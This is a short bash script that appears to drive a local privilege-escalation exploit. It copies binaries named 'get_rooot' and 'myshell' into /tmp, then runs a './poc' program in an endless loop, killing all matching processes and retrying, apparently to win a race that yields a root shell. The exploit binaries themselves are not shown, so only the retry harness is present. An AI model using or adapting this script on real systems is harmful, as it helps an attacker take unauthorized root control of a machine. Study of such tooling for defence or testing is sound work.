#!/bin/bash

cp get_rooot /tmp/
cp myshell /tmp/
while true
do
    ./poc
    ps aux | grep poc | awk '{ print $2 }' | while read line; do kill -9 $line; done || echo "kill poc, rerun again"
done